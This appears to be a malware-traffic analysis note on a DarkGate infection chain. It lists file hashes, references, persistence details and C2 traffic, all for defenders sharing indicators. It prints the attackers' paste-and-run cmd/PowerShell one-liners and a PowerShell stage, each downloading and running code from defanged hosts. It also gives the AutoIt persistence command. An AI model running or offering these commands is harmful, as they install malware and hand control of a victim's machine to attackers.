@@ -1,0 +1,180 @@
+2024-05-14 (TUESDAY): DARKGATE ACTIVITY
+
+INITIAL REFERENCES:
+
+- https://twitter.com/jcarndt/status/1790441771249320354
+- https://twitter.com/Max_Mal_/status/1790709472328814634
+- https://bazaar.abuse.ch/sample/01037b2cc999d1d16c1ebcc90d35c3b6f61c543f78d03e495dd924d50db818b0/
+
+INFECTION CHAIN:
+
+- unknown source --> HTML file --> victim runs CMD script from HMTL file --> downloads & runs HTA file -->
+  retreives & runs PowerShell script --> Retreives & runs Autoitv3 package for DarkGate --> DarkGate C2
+
+13 EXAMPLES OF HTML FILES USED FOR THIS INFECTION CHAIN:
+
+- b8229d8cc26b1622815a3d3537ab3c6a4a1ec24888953eda0d69cd602f05c272 - 63,193 bytes - May_119275.html
+- 3fe42a4a39f3d0136df91b1d1b2959229cbe0e3cf2f4106e007b3f4f5548e80a - 63,193 bytes - May_234892.html
+- 224d0143a56436022401792f17fb3794684c4f5f8041dd650de1d3fb8494fbfd - 63,193 bytes - May_299872.html
+- 7d89719f670760b2947490c40649128ccaf5fbc07368cfb2763ca3998c6cd9f9 - 63,193 bytes - May_328152.html
+- 0f1c3f1142a2d8fa1e38325830f53ed18a9a2110f6f390f0c514f379cda6d752 - 63,193 bytes - May_436171.html
+- 638c9af9e73f0ba1f92022c5eb0f2b42a7f15471d18678c91690d291b5ca68f9 - 63,193 bytes - May_446619.html
+- 01037b2cc999d1d16c1ebcc90d35c3b6f61c543f78d03e495dd924d50db818b0 - 63,193 bytes - May_554063.html
+- 0f48436d98086390b6ddefd7ad9974947224400d419f6d9373e29ca47e8e8357 - 63,193 bytes - May_447386.html
+- 107994ddca0ed2b774041c076b699df4f34d2fbdca11539404571cb133d41554 - 63,193 bytes - May_583479.html
+- e8dcc385584b5859ef5674bf26a986957a6eaeab87389fad2c9bcca9ca900456 - 63,193 bytes - May_654380.html
+- 28c3ecfb7bf397fb6713ca739162b676f57b58fc10a62003e1bc2d9f364e4cfc - 63,193 bytes - May_673434.html
+- 232b5aee821e426540ee151fe260fe4fb05b6bff1d3d4de6c65b8de22b1c13fd - 63,193 bytes - May_765966.html
+- b83ce1fb93f6e9f4d52deb736d1362e645a6e5a8f8371ee77a21228140f541b0 - 63,193 bytes - May_787116.html
+
+EXAMPLES OF CMD SCRIPT FROM THE HTML FILES FOR VICTIM TO PASTE AND RUN:
+
+- cmd /c start /min powershell $GY = 'c:\users\public\Oc.hta';invoke-webrequest -uri 
+  hxxps://www.rockcreekdds[.]com/wp-content/1.hta -outfile $GY;start-process $GY;Set-Clipboard 
+  -Value ' ';exit;
+
+- cmd /c start /min powershell $qf = 'c:\users\public\jt.hta';invoke-webrequest -uri 
+  hxxps://www.rockcreekdds[.]com/wp-content/1.hta -outfile $qf;start-process $qf;Set-Clipboard 
+  -Value ' ';exit;
+
+- cmd /c start /min powershell $to = 'c:\users\public\Sa.hta';invoke-webrequest -uri 
+  hxxps://www.rockcreekdds[.]com/wp-content/1.hta -outfile $to;start-process $to;Set-Clipboard 
+  -Value ' ';exit;
+
+DOWNLOADED HTA FILE:
+
+- SHA256 hash: 5c204217d48f2565990dfdf2269c26113bd14c204484d8f466fb873312da80cf
+- File size: 2,326 bytes
+- File type: HTML document text, ASCII text, with CRLF line terminators
+- File location: hxxps://www.rockcreekdds[.]com/wp-content/1.hta
+- Saved file location: C:\Users\Public\[two random ASCII characters].hta
+- File description: HTA file to download Powershell script 
+
+POWERSHELL SCRIPT RETREIVED BY ABOVE HTA FILE:
+
+- ni 'C:/nkll/' -Type Directory -Force;cd 'C:/nkll/';Invoke-WebRequest -Uri 
+  "hxxp://flexiblemaria[.]com/iinkqrwu" -OutFile 'file.zip';Expand-Archive -Path 'file.zip' 
+  -DestinationPath 'C:/nkll/';start 'AutoIt3.exe' -a 'script.a3x';attrib +h 'C:/nkll/'
+
+FILES FROM C:\NKLL\ DIRECTORY:
+
+- 237d1bca6e056df5bb16a1216a434634109478f882d3b1d58344c801d184f95d - 893,608 bytes - Autoit3.exe
+- 8c382d51459b91b7f74b23fbad7dd2e8c818961561603c8f6614edc9bb1637d1 - 841,674 bytes - file.zip
+- 2f05419f0baf87feb1c1f4ecb6d391fd9e8083e9e5219fba09875aaca85001a2 - 559,792 bytes - script.a3x
+
+PERSISTENT DARKGATE FILES FROM C:\PROGRAMDATA\FEBABBH\ DIRECTORY:
+
+- 237d1bca6e056df5bb16a1216a434634109478f882d3b1d58344c801d184f95d - 893,608 bytes - Autoit3.exe
+- 2f05419f0baf87feb1c1f4ecb6d391fd9e8083e9e5219fba09875aaca85001a2 - 559,792 bytes - gkfedbd.a3x
+
+PERSISTENCE THROUGH WINDOWS SHORTCUT IN THE START MENU'S STARTUP FOLDER RUNNING THIS COMMAND:
+
+- C:\ProgramData\febabbh\Autoit3.exe C:\ProgramData\febabbh\gkfedbd.a3x
+
+EXAMPLE OF START OF TRAFFFIC FROM AN INFECTED WINDOWS HOST:
+
+DATE/TIME                DESTINATION IP     PORT  DOMAIN                  URL
+-----------------------  -----------------  ----  ----------------------  -----------------------------
+2024-05-15 00:01:19 UTC  104.154.143[.]100  443   www.rockcreekdds[.]com  GET /wp-content/1.hta [HTTPS]
+2024-05-15 00:01:22 UTC  91.222.173[.]186   80    flexiblemaria[.]com     GET /umkglnks HTTP/1.1
+2024-05-15 00:01:22 UTC  91.222.173[.]186   80    flexiblemaria[.]com     GET /iinkqrwu HTTP/1.1
+2024-05-15 00:01:28 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:29 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:29 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:30 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:31 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:31 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:32 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:32 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:33 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:33 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:34 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:35 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:35 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:36 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:36 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:37 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:37 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:38 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:38 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:39 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:40 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:40 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:41 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:41 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:42 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:42 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:43 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:44 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:44 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:45 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:45 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:46 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:46 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:47 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:48 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:48 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:49 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:49 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:50 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:50 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:51 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:51 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:52 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:53 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:53 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:54 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:54 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:55 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:56 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:56 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:57 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:57 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:58 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:58 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:01:59 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:00 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:00 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:01 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:01 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:02 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:02 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:03 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:04 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:04 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:05 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:05 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:06 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:06 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:07 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:08 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:08 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:09 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:09 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:10 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:10 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:11 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:12 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:12 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:13 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:13 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:14 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:14 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:15 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:15 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:16 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:17 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:17 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:18 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:18 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:19 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:19 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:20 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:20 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:21 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:22 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:22 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:23 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:23 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:24 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
+2024-05-15 00:02:24 UTC  91.222.173[.]186   80    flexiblemaria[.]com     POST / HTTP/1.0
